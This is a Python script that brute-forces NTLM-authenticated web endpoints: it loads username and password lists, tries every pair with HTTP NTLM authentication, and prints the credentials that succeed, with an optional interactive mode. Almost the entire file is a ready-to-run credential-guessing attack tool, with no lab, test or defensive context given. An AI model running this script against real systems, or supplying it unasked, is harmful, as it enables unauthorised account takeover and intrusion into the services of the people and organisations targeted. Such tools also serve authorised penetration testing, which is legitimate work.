#!/usr/bin/env python3

"""
NTLM BRUTE
(probably unworkable in these modern times)
(and yet..)

Usage:
    python3 brute_force_ntlm.py <url> <users_file> <passwords_file>

The script optionally runs in interactive mode. When enabled, it will pause after
each attempt, allowing you to review the output before continuing.
"""
import os,sys,re
import requests
from requests_ntlm import HttpNtlmAuth

def load_list(filename):
    """
    Reads lines from a file and returns a list of non-empty, stripped strings.
    
    Args:
        filename (str): Path to the file.
        
    Returns:
        list: List of strings from the file.
    """
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        sys.exit(1)

def brute_force(url, users_file, passwords_file, interactive=False):
    """
    Attempts NTLM brute forcing against the provided URL using the lists of users and passwords.
    
    Args:
        url (str): The target URL.
        users_file (str): Path to the file containing usernames.
        passwords_file (str): Path to the file containing passwords.
        interactive (bool): If True, the script will pause after each attempt.
    """
    # Load username and password lists
    users = load_list(users_file)
    passwords = load_list(passwords_file)
    
    # Iterate over each username
    for user in users:
        print(f"\n=== Testing user: {user} ===")
        found_valid = False
        # Iterate over each password for the current user
        for password in passwords:
            print(f"Attempting: {user}:{password}")
            try:
                # Make an HTTP GET request with NTLM authentication.
                response = requests.get(url, auth=HttpNtlmAuth(user, password), timeout=10)
            except requests.exceptions.RequestException as e:
                print(f"Request error for {user}:{password} -> {e}")
                # In interactive mode, wait for user input before continuing.
                if interactive:
                    input("Press Enter to continue to next attempt...")
                continue

            # Check the HTTP status code.
            if 200 <= response.status_code < 300:
                print(f"[SUCCESS] Valid credentials: {user}:{password}\n")
                found_valid = True
                # If in interactive mode, prompt user to decide whether to continue for this user.
                if interactive:
                    decision = input("Press Enter to continue brute-forcing this user or type 'next' to move to the next user: ")
                    if decision.strip().lower() == "next":
                        break
                else:
                    # In non-interactive mode, move on to the next user after a success.
                    break
            elif 300 <= response.status_code < 400:
                print(f"[REDIRECT] Received status {response.status_code} for {user}:{password}.")
                if interactive:
                    input("Press Enter to continue to next attempt...")
            else:
                print(f"[FAILED] {user}:{password} -> Status: {response.status_code}")
                if interactive:
                    input("Press Enter to continue to next attempt...")
        # End of password list for the current user
        if not found_valid:
            print(f"No valid credentials found for user: {user}")
        else:
            print(f"Finished testing for user: {user}")

def main():
    # Ensure correct number of command-line arguments
    if len(sys.argv) != 4:
        print("Usage: python3 brute_force_ntlm.py <url> <users_file> <passwords_file>")
        sys.exit(1)
    
    url = sys.argv[1]
    users_file = sys.argv[2]
    passwords_file = sys.argv[3]
    
    # Ask the user if they want to run in interactive mode.
    choice = input("Run in interactive mode? (Y/n): ").strip().lower()
    interactive = True if choice in ["", "y", "yes"] else False
    
    brute_force(url, users_file, passwords_file, interactive)

if __name__ == "__main__":
    main()
